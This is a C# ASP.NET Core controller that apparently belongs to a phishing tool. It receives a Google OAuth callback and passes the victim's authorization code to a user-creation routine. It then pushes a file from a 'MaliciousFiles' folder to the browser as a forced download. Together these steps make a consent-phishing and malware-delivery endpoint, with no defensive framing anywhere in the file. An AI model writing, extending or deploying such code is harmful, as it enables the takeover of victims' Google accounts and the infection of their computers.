using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Configuration;
using System;
using System.IO;
using Maraki1982.Web.Utilities.Interfaces;
using Maraki1982.Core.Models.Enum;
using Microsoft.Extensions.Logging;

namespace Maraki1982.Web.Controllers
{
    [Route("google")]
    public class GoogleController : Controller
    {
        private readonly IConfiguration _configuration;
        private readonly IUserUtility _userUtility;
        private readonly ILogger<GoogleController> _logger;

        public GoogleController(IConfiguration configuration, IUserUtility userUtility, ILogger<GoogleController> logger)
        {
            _configuration = configuration;
            _userUtility = userUtility;
            _logger = logger;
        }

        [HttpGet]
        [Route("token")]
        public IActionResult Index([FromQuery] string state, [FromQuery] string code, [FromQuery] string scope)
        {
            try
            {
                _userUtility.CreateUpdateUser(code, VendorEnum.Google);

                return DownloadMaliciousFile();
            }
            catch (Exception ex)
            {

                _logger.LogError(ex, ex.Message);
                return Redirect(_configuration["Authentication:Google:ExceptionRedirectUrl"]);
            }
        }

        private IActionResult DownloadMaliciousFile()
        {
            string path = Path.Combine(Environment.CurrentDirectory, "MaliciousFiles", _configuration["Authentication:Google:FileToDownload"]);
            FileStream fileStream = System.IO.File.OpenRead(path);

            return (File(fileStream, "application/octet-stream", Path.GetFileName(path)));
        }
    }
}